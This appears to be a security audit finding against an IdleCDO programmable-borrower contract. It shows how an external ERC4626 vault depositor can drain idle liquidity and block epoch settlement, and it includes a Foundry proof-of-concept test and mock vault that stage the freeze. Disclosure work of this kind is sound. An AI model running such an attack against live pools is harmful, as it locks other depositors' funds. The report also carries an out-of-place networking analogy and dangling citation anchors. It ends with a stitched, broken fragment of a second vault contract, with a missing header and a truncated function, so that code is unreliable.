### Title
External ERC4626 liquidity withdrawal can indefinitely delay programmable epoch settlement - (`contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary

An unprivileged liquidity provider in the programmable borrower's configured ERC4626 vault can consume the vault's immediately withdrawable liquidity after an epoch starts. `ProgrammableBorrower.onStopEpoch()` verifies only that the borrower's shares are economically sufficient through `convertToAssets`, then unconditionally calls `vault.withdraw`; an ERC4626 liquidity revert is converted into `StopEpochVaultLiquidityUnavailable`, which propagates through `IdleCDOEpochVariant.stopEpoch` and atomically prevents settlement. [1](#0-0) [2](#0-1) 

### Finding Description

`onStartEpoch` deposits all on-hand underlying into the shared ERC4626 vault while recording `epochPendingWithdraws` only as an accounting reservation. [3](#0-2) 

At settlement, `stopEpoch` requests `_amountToPullFromBorrower + _pendingWithdraws` through the programmable-borrower hook before it can collect withdraw funding, update accounting, close the epoch, and reopen withdrawals. [4](#0-3) 

If the required amount exceeds the programmable borrower's cash balance, `onStopEpoch` computes the shortfall and checks `shortfall <= _currentVaultAssets()`. [5](#0-4) 

That check measures share value, not immediately available ERC4626 liquidity, so an external vault user can withdraw the vault's idle assets while the programmable borrower's shares remain fully valued. [6](#0-5) 

The subsequent `vault.withdraw(shortfall, ...)` reverts and `onStopEpoch` raises `StopEpochVaultLiquidityUnavailable`. [7](#0-6) 

Because this hook is invoked outside the `try this.getFundsFromBorrower(...)` catch block, the revert is not converted into a borrower default and instead rolls back the entire epoch-stop transaction. [2](#0-1) 

The normal escape mechanisms do not bypass the condition: `emergencyExitVault` still calls `vault.redeem`, while `setVault` is blocked both by active epoch accounting and by nonzero vault shares. [8](#0-7) [9](#0-8) 

### Impact Explanation

A public ERC4626 vault participant can temporarily freeze settlement for the entire programmable credit pool after the epoch has started, analogous to lowering the effective transmission capacity after handshake completion. [1](#0-0) 

For example, with 100,000 USDC of pool assets parked in the vault and a 10,000 USDC pending withdrawal, an external vault LP can drain the vault's idle cash so that the 10,000 USDC `withdraw` reverts even though the programmable borrower's shares still value at 100,000 USDC. [10](#0-9) 

Until sufficient liquidity returns, the epoch remains running, `pendingWithdraws` cannot be collected, tranche prices cannot be finalized, and all active and queued LP value remains behind the unsettled epoch. [11](#0-10) [12](#0-11) 

### Likelihood Explanation

The attacker needs only to be an ordinary shareholder or withdrawal-enabled user of the configured ERC4626 vault, not the borrower, owner, manager, guardian, or another privileged Idle role. [7](#0-6) 

The attack requires a programmable-borrower deployment that places settlement liquidity into a shared ERC4626 vault whose available cash can be consumed independently of the borrower's share valuation. [13](#0-12) 

Sustaining the freeze requires the vault's lending market or withdrawal queue to remain illiquid, or repeated consumption of newly available liquidity by vault users, so the expected duration depends on the selected vault rather than on IdleCDO itself. [14](#0-13) 

### Recommendation

Keep settlement obligations in an isolated liquid reserve instead of relying on `epochPendingWithdraws` to reserve funds that have been deposited into a shared ERC4626 vault. [15](#0-14) 

At minimum, use `maxWithdraw(address(this))` or equivalent liquidity-aware accounting when deciding whether `vault.withdraw` can succeed, cap vault deposits so reserved liabilities remain on hand, and prefer ERC4626 vaults with segregated or queued liquidity that cannot be depleted by unrelated shareholders. [1](#0-0)

contract SharedLiquidityVault is ERC20 {
  IERC20Detailed public immutable assetToken;
  uint256 public managedAssets;

  constructor(address _asset) ERC20("Shared Liquidity Vault", "SLV") {
    assetToken = IERC20Detailed(_asset);
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    return supply == 0 ? shares : shares * managedAssets / supply;
  }

  function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    uint256 assetsBefore = managedAssets;
    uint256 supply = totalSupply();
    shares = supply == 0 || assetsBefore == 0 ? assets : assets * supply / assetsBefore;
    managedAssets += assets;
    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function withdraw(uint256 assets, address receiver, address owner)
    external
    returns (uint256 shares)
  {
    // The ERC4626 position remains valuable, but its idle cash is exhausted.
    require(assetToken.balanceOf(address(this)) >= assets, "insufficient-liquidity");
    shares = convertToAssets(assets) == 0 ? assets : assets * totalSupply() / managedAssets;
    if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
    managedAssets -= assets;
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }

  // Vault manager allocation: underlying leaves the vault but remains counted as assets.
  function lend(uint256 assets, address market) external {
    assetToken.transfer(market, assets);
  }
}

function testExternalVaultLpBlocksProgrammableStopEpoch() public {
  SharedLiquidityVault sharedVault = new SharedLiquidityVault(USDC);
  _setUpProgrammableBorrowerCreditVault(FORK_BLOCK, address(sharedVault));

  address attacker = makeAddr("external-vault-lp");
  uint256 lpDeposit = 50_000 * oneScale;
  uint256 poolDeposit = 100_000 * oneScale;
  uint256 pendingWithdraw = 10_000 * oneScale;

  // External LP enters before the programmable borrower.
  deal(USDC, attacker, lpDeposit);
  vm.startPrank(attacker);
  underlying.approve(address(sharedVault), lpDeposit);
  sharedVault.deposit(lpDeposit, attacker);
  vm.stopPrank();

  // Deposit pool funds and create a 10k pending withdrawal during the buffer.
  idleCDO.depositAA(poolDeposit);
  cdoEpoch.requestWithdraw(
    pendingWithdraw * ONE_TRANCHE_TOKEN / cdoEpoch.virtualPrice(address(aaTranche)),
    address(aaTranche)
  );

  vm.prank(manager);
  cdoEpoch.startEpoch();

  // Honest vault allocation leaves 25k idle while all 150k remains ERC4626 assets.
  sharedVault.lend(125_000 * oneScale, makeAddr("vault-market"));

  // Attacker consumes the remaining idle liquidity with a legitimate withdrawal.
  vm.prank(attacker);
  sharedVault.withdraw(25_000 * oneScale, attacker, attacker);

  assertEq(assetTokenBalance(), 0);
  assertGe(sharedVault.convertToAssets(
    sharedVault.balanceOf(address(programmableBorrower))
  ), pendingWithdraw);

  vm.warp(cdoEpoch.epochEndDate() + 1);
  vm.prank(manager);
  vm.expectRevert(StopEpochVaultLiquidityUnavailable.selector);
  cdoEpoch.stopEpoch(0, 0);

  assertTrue(cdoEpoch.isEpochRunning());
  assertFalse(cdoEpoch.defaulted());
  assertEq(underlying.balanceOf(address(strategy)), 0);
}

  uint256 public withdrawLimit = type(uint256).max;

  constructor(address _asset) ERC20("Stop Epoch Liquidity Vault", "SELV") {
    assetToken = IERC20Detailed(_asset);
  }

    return address(assetToken);
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    if (supply == 0) return shares;
    return shares * assetToken.balanceOf(address(this)) / supply;
  }

  function maxWithdraw(address owner) external view returns (uint256) {
    uint256 assets = convertToAssets(balanceOf(owner));
    return assets < withdrawLimit ? assets : withdrawLimit;
  }

  function setWithdrawLimit(uint256 assets) external {
    withdrawLimit = assets;
  }

  function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    uint256 assetsBefore = assetToken.balanceOf(address(this));
    uint256 supply = totalSupply();
    shares = supply == 0 || assetsBefore == 0 ? assets : assets * supply / assetsBefore;
    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
